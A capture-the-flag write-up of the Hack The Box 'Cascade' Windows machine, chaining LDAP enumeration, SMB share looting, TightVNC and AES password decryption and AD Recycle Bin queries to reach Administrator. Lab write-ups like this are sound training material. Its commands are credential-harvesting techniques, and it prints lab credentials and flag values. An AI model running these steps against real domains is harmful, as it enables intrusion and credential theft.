# HTB Cascade — Full Writeup

**Platform:** Hack The Box  
**OS:** Windows  
**Difficulty:** Medium  
**Category:** Active Directory  
**Status:** Retired  

---

## Table of Contents

1. [Machine Overview](#machine-overview)
2. [Enumeration](#enumeration)
3. [Foothold — r.thompson](#foothold--rthompson)
4. [Lateral Movement — s.smith](#lateral-movement--ssmith)
5. [Lateral Movement — ArkSvc](#lateral-movement--arksvc)
6. [Privilege Escalation — Administrator](#privilege-escalation--administrator)
7. [Attack Chain Summary](#attack-chain-summary)
8. [Key Takeaways](#key-takeaways)

---

## Machine Overview

Cascade is a Medium-difficulty Windows Active Directory box that simulates a realistic corporate AD environment. The attack path requires chaining together multiple credential discovery techniques including LDAP anonymous enumeration, registry credential extraction, .NET binary reverse engineering, AES decryption, and AD Recycle Bin abuse. No exploitation of CVEs is required — the entire chain relies on misconfigurations and poor credential hygiene.

**Target IP:** `10.129.12.0`  
**Domain:** `cascade.local`  
**DC Hostname:** `CASC-DC1`

---

## Enumeration

### LDAP Anonymous Enumeration

The first step is confirming anonymous LDAP bind is allowed and enumerating domain users.

```bash
# Discover the base DN
ldapsearch -x -H ldap://10.129.12.0 -b "" -s base namingContexts

# Dump all user sAMAccountNames
ldapsearch -x -H ldap://10.129.12.0 -b "DC=cascade,DC=local" "(objectClass=user)" sAMAccountName
```

**Flags used:**
- `-x` — simple/anonymous bind (no Kerberos)
- `-H` — specify the LDAP URI
- `-b` — base DN to search from
- `(objectClass=user)` — filter to only return user objects
- `sAMAccountName` — return only the login name attribute

This reveals all domain user accounts. Of note: `r.thompson` corresponds to Ryan Thompson.

### Dumping Full User Object

Querying the full r.thompson object reveals a non-standard attribute:

```bash
ldapsearch -x -H ldap://10.129.12.0 -b "DC=cascade,DC=local" "(sAMAccountName=r.thompson)"
```

**Key finding in output:**
```
cascadeLegacyPwd: clk0bjVldmE=
```

This is a custom AD attribute storing a legacy password in base64. Decoding it:

```bash
echo "clk0bjVldmE=" | base64 -d
# Output: rY4n5eva
```

**r.thompson credentials: `r.thompson:rY4n5eva`**

---

## Foothold — r.thompson

### SMB Share Enumeration

With r.thompson's credentials, enumerate accessible SMB shares:

```bash
nxc smb 10.129.12.0 -u r.thompson -p rY4n5eva --shares
```

**Accessible shares:**
| Share | Permissions |
|---|---|
| Data | READ |
| NETLOGON | READ |
| SYSVOL | READ |
| print$ | READ |

The `Data` share is non-standard and the most interesting target.

### Looting the Data Share

```bash
smbclient //10.129.12.0/Data -U 'r.thompson%rY4n5eva'
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

**Files retrieved:**
```
IT/Email Archives/Meeting_Notes_June_2018.html
IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
IT/Logs/DCs/dcdiag.log
IT/Temp/s.smith/VNC Install.reg
```

### Analyzing Meeting_Notes_June_2018.html

The email archive contains a critical hint: a temporary admin account (`TempAdmin`) was created and used the same password as the real Administrator account. This is the breadcrumb that pays off at the end of the chain.

### Extracting s.smith's VNC Password

`VNC Install.reg` contains a TightVNC server configuration for s.smith with a password stored as a hex-encoded value:

```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

**TightVNC DES Decryption**

TightVNC stores passwords encrypted with a hardcoded DES key (`e84ad660c4721ae0`). This is a well-known weakness — the key is baked into the source code and never changes, making any TightVNC password hash trivially reversible:

```bash
echo -n '6bcf2a4b6e5aca0f' | xxd -r -p | openssl enc -des-cbc --nopad --nosalt \
  -K e84ad660c4721ae0 \
  -iv 0000000000000000 \
  -d
# Output: sT333ve2
```

**s.smith credentials: `s.smith:sT333ve2`**

---

## Lateral Movement — s.smith

### WinRM Access

s.smith is a member of `Remote Management Users`, allowing WinRM login:

```bash
evil-winrm -i 10.129.12.0 -u s.smith -p sT333ve2
```

**User flag retrieved:** `dba149f5d0e99ad8d798e4dc7e67b561`

### Key Groups (whoami /all)

```
CASCADE\Audit Share   ← s.smith has this; r.thompson did not
CASCADE\IT
CASCADE\Remote Management Users
```

Membership in `Audit Share` grants read access to the `Audit$` share that was previously locked out.

### Looting the Audit$ Share

```bash
smbclient //10.129.12.0/Audit$ -U 'cascade\s.smith%sT333ve2'
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

**Files retrieved:**
```
CascAudit.exe
CascCrypto.dll
RunAudit.bat
System.Data.SQLite.dll
DB/Audit.db
```

This is a custom audit application. `RunAudit.bat` shows how it's invoked:
```
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

### Extracting the Encrypted Credential from SQLite

```bash
sqlite3 DB/Audit.db
```

```sql
.tables
-- DeletedUserAudit  Ldap  Misc

SELECT * FROM Ldap;
-- 1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local

SELECT * FROM DeletedUserAudit;
-- Reveals: TempAdmin (deleted user — important for later)
```

The `Ldap` table contains ArkSvc's password encrypted as `BQO5l5Kj9MdErXx6Q6AGOw==`. Unlike the base64-encoded `cascadeLegacyPwd` earlier, this is AES-encrypted ciphertext — it cannot be decoded without the key.

### .NET Binary Reverse Engineering

Install ilspycmd to decompile the .NET assemblies:

```bash
./dotnet-install.sh --channel 10.0
export DOTNET_ROOT=$HOME/.dotnet
export PATH=$PATH:$HOME/.dotnet:$HOME/.dotnet/tools
dotnet tool install --global ilspycmd
```

Decompile both binaries:

```bash
ilspycmd CascCrypto.dll
ilspycmd CascAudit.exe
```

**From CascCrypto.dll — hardcoded IV:**
```csharp
public const string DefaultIV = "1tdyjCbY1Ix49842";
// AES-128-CBC mode
```

**From CascAudit.exe — hardcoded key:**
```csharp
password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
```

### Decrypting ArkSvc's Password

With the key and IV extracted, decrypt the ciphertext using OpenSSL. The key and IV must be converted from ASCII to hex since OpenSSL's `-K` and `-iv` flags expect hex:

```bash
echo "BQO5l5Kj9MdErXx6Q6AGOw==" | openssl enc -aes-128-cbc -d \
  -K $(echo -n "c4scadek3y654321" | xxd -p) \
  -iv $(echo -n "1tdyjCbY1Ix49842" | xxd -p) \
  -a
# Output: w3lc0meFr31nd
```

**Command breakdown:**
- `-aes-128-cbc` — algorithm matching the C# code (`KeySize=128`, `CipherMode.CBC`)
- `-d` — decrypt mode
- `-K` — AES key in hex
- `-iv` — initialization vector in hex
- `-a` — input is base64-encoded (decode before decrypting)
- `xxd -p` — converts ASCII string to hex for OpenSSL

**ArkSvc credentials: `ArkSvc:w3lc0meFr31nd`**

---

## Lateral Movement — ArkSvc

### WinRM Access

```bash
evil-winrm -i 10.129.12.0 -u ArkSvc -p w3lc0meFr31nd
```

### Key Groups (whoami /all)

```
CASCADE\AD Recycle Bin   ← this is the critical group
CASCADE\IT
CASCADE\Remote Management Users
```

ArkSvc is a member of `AD Recycle Bin` — this group can read attributes of deleted AD objects, including custom attributes like `cascadeLegacyPwd`.

### Querying the AD Recycle Bin

```powershell
Get-ADObject -Filter {SamAccountName -eq "TempAdmin"} -IncludeDeletedObjects -Properties *
```

**Command breakdown:**
- `Get-ADObject` — retrieves any AD object type (more flexible than `Get-ADUser`)
- `-Filter {SamAccountName -eq "TempAdmin"}` — filter by login name
- `-IncludeDeletedObjects` — search the `CN=Deleted Objects` container (invisible to normal queries)
- `-Properties *` — return all attributes including custom ones

**Key finding in output:**
```
cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz
isDeleted        : True
DistinguishedName: CN=TempAdmin\0ADEL:...,CN=Deleted Objects,DC=cascade,DC=local
```

Decoding the legacy password:

```bash
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
# Output: baCT3r1aN00dles
```

---

## Privilege Escalation — Administrator

The email archive retrieved early in the engagement stated that TempAdmin used the same password as the real Administrator account. Applying TempAdmin's recovered password to Administrator:

```bash
evil-winrm -i 10.129.12.0 -u Administrator -p baCT3r1aN00dles
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
68f959450eea6e51ba57ec5daa8a7a4b
```

**Root flag retrieved.**

---

## Attack Chain Summary

```
Anonymous LDAP Enum
        ↓
cascadeLegacyPwd → r.thompson:rY4n5eva
        ↓
SMB Data Share → VNC Install.reg
        ↓
TightVNC DES Decrypt → s.smith:sT333ve2
        ↓
SMB Audit$ Share → CascAudit.exe + Audit.db
        ↓
.NET RE (ilspycmd) → AES Key + IV
        ↓
AES-128-CBC Decrypt → ArkSvc:w3lc0meFr31nd
        ↓
AD Recycle Bin → TempAdmin cascadeLegacyPwd
        ↓
Base64 Decode → Administrator:baCT3r1aN00dles
        ↓
ROOT
```

---

## Key Takeaways

**1. Anonymous LDAP is a goldmine**  
Many AD environments allow anonymous bind. Always attempt unauthenticated LDAP enumeration before reaching for credentials. Custom attributes like `cascadeLegacyPwd` are invisible unless you dump all properties.

**2. Recognize ciphertext vs hashes**  
`BQO5l5Kj9MdErXx6Q6AGOw==` is clearly base64-encoded ciphertext, not a hash. Hashes are fixed-length hex strings with recognizable formats. Ciphertext requires finding the key — which lives in the application that produced it.

**3. Custom applications hide keys in plain sight**  
When a custom binary stores encrypted credentials, the decryption logic and hardcoded keys are recoverable through .NET decompilation. `ilspycmd` and `dnSpy` make .NET RE straightforward.

**4. TightVNC passwords are never truly encrypted**  
The hardcoded DES key (`e84ad660c4721ae0`) is public knowledge. Any TightVNC `Password=hex:...` value in a registry file or export is immediately reversible.

**5. AD Recycle Bin preserves all attributes**  
Deleted AD objects retain their attributes — including sensitive custom ones — until the tombstone lifetime expires (default 180 days). AD Recycle Bin group membership allows reading these objects, making it a high-value target in privilege escalation chains.

**6. Follow the breadcrumbs**  
The email archive found early in enumeration directly foreshadowed the final step. In real engagements and CTFs alike, notes and internal communications often contain the context needed to connect the dots later.

---

*Writeup by nt0wl | HTB: nt0wl*
